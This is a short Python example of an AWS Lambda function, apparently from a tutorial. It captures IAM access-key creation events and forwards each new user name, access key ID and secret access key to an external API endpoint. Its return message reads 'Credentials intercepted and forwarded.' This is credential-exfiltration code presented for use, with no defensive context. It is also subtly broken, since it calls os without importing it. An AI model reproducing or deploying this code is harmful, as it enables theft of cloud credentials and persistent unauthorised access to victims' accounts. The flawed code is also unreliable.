### Lambda Function Code (Python Example):
Here is a simple Python example for the Lambda function that intercepts IAM credential creation events and forwards them to an external API gateway.

```python
import json
import boto3
import requests

def lambda_handler(event, context):
    api_gateway_url = os.environ['API_GATEWAY_URL']

    for record in event['Records']:
        if record['eventName'] == 'CreateAccessKey':
            user_name = record['userIdentity']['userName']
            access_key_id = record['responseElements']['accessKey']['accessKeyId']
            secret_access_key = record['responseElements']['accessKey']['secretAccessKey']

            payload = {
                'user_name': user_name,
                'access_key_id': access_key_id,
                'secret_access_key': secret_access_key
            }

            response = requests.post(api_gateway_url, json=payload)
            if response.status_code != 200:
                print(f"Failed to forward credentials: {response.status_code}")

    return {
        'statusCode': 200,
        'body': json.dumps('Credentials intercepted and forwarded.')
    }
```

